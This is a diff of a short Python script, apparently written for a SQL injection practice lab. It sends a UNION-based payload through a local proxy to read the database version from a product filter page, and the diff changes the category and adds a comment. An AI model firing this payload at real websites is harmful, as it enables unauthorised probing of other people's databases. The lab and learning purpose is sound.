@@ -14,15 +14,15 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 def exploit_sqli_version(url):
-    path = "/filter?category=Accessories"
+    path = "/filter?category=Lifestyle"
     sql_payload = "' UNION SELECT @@version, NULL%23"
     r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
     res = r.text
     soup = BeautifulSoup(res, 'html.parser')
     version = soup.find(text=re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*')) # our output will be 8.0.35 or 00.00.00 the number can be anything 
     # so we need 2 digits after every point so we have used {1,2} it is for that reason 
-    
-    if version is None:
+
+    if version is None: # whem it will give no results for that we have used none
         return False
     else:
         print("[+] The database version is: " + version)
